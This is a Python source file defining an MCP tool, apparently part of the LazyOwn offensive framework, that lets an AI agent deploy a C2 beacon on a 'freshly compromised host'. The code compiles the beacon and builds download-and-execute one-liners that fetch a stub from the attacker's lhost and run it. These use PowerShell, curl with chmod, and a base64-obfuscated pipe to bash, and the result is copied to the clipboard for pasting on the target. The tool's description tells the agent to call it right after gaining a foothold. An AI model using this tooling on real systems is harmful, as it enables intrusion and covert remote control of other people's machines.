"""MCP tool ``lazyown_deploy_beacon`` (migrated from the call_tool dispatch chain)."""

from __future__ import annotations

import asyncio
import json
from typing import Any

from mcp import types
from mcp_tools._context import MCPContext

TOOL = types.Tool(
    name="lazyown_deploy_beacon",
    description=(
        "Generate and clipboard-copy the one-liner to deploy the LazyOwn beacon/stub "
        "on a freshly compromised host. Reads sessions/os.json to detect platform "
        "(Linux/Windows/Mac), picks the correct payload command, and copies it with xclip. "
        "Also triggers do_c2 to compile the beacon if not already built. "
        "Call this immediately after achieving foothold/intrusion success."
    ),
    inputSchema={
        "type": "object",
        "properties": {
            "platform_override": {
                "type": "string",
                "description": (
                    "Force platform: 'linux', 'windows', 'mac'. If omitted, auto-detected from sessions/os.json."
                ),
            },
            "compile": {
                "type": "boolean",
                "description": "Compile the beacon before generating the deploy command (default true).",
            },
        },
        "required": [],
    },
)


async def handle(arguments: dict[str, Any], tool_name: str, ctx: MCPContext) -> list:
    """Handle the lazyown_deploy_beacon MCP tool."""
    do_compile = arguments.get("compile", True)
    plat_override = (arguments.get("platform_override") or "").strip().lower()

    def _deploy_beacon_sync() -> str:
        """
        Detect platform, compile beacon if needed, generate one-liner, copy to clipboard.
        Returns a human-readable status string.
        """
        cfg_d = ctx.load_payload()
        lhost = cfg_d.get("lhost", "")
        lport = cfg_d.get("lport", "4444")

        # Resolve platform
        platform = plat_override
        if not platform:
            os_path = ctx.sessions_dir / "os.json"
            if os_path.exists():
                try:
                    os_data = json.loads(os_path.read_text())
                    if isinstance(os_data, list) and os_data:
                        raw_os = os_data[0].get("os", "").lower()
                        if "windows" in raw_os:
                            platform = "windows"
                        elif "linux" in raw_os:
                            platform = "linux"
                        elif "mac" in raw_os or "darwin" in raw_os:
                            platform = "mac"
                except Exception:
                    pass
        if not platform:
            platform = "linux"

        # Optionally compile the beacon via do_c2
        compile_note = ""
        if do_compile:
            choice_map = {"linux": "2", "windows": "1", "mac": "4"}
            c2_choice = choice_map.get(platform, "2")
            try:
                ctx.run_command(f"c2 {c2_choice}", timeout_s=120)
                compile_note = f"beacon compiled (platform={platform})"
            except Exception as exc:
                compile_note = f"compile skipped: {exc}"

        # Generate platform-appropriate one-liner
        if not lhost:
            return "lhost not set in payload.json — cannot generate deploy command"

        if platform == "windows":
            stub_url = f"http://{lhost}/stub.exe"
            cmd = f"powershell -c \"Invoke-WebRequest '{stub_url}' -OutFile 'stub.exe'; Start-Process 'stub.exe'\""
        elif platform == "mac":
            cmd = f"curl http://{lhost}/stub -o /tmp/stub && chmod +x /tmp/stub && /tmp/stub"
        else:
            import base64 as _b64

            raw = f"curl http://{lhost}/stub -o /tmp/stub && [ -s /tmp/stub ] && chmod +x /tmp/stub && /tmp/stub"
            encoded = _b64.b64encode(raw.encode()).decode()
            cmd = f"echo '{encoded}' | base64 -d | bash"

        # Copy to clipboard
        clip_note = ""
        try:
            import subprocess as _sp

            _sp.run(
                ["xclip", "-sel", "clip"],
                input=cmd.encode(),
                check=True,
                capture_output=True,
            )
            clip_note = "copied to clipboard (xclip)"
        except FileNotFoundError:
            try:
                import subprocess as _sp

                _sp.run(
                    ["xsel", "--clipboard", "--input"],
                    input=cmd.encode(),
                    check=True,
                    capture_output=True,
                )
                clip_note = "copied to clipboard (xsel)"
            except Exception:
                clip_note = "clipboard copy failed (xclip/xsel not available)"

        lines = [
            f"Platform:  {platform}",
            f"lhost:     {lhost}",
            f"lport:     {lport}",
        ]
        if compile_note:
            lines.append(f"Compile:   {compile_note}")
        lines += [
            f"Clipboard: {clip_note}",
            "",
            "Deploy command (paste on foothold):",
            cmd,
        ]
        return "\n".join(lines)

    result_str = await asyncio.get_event_loop().run_in_executor(None, _deploy_beacon_sync)
    return ctx.text(tool_name, result_str)
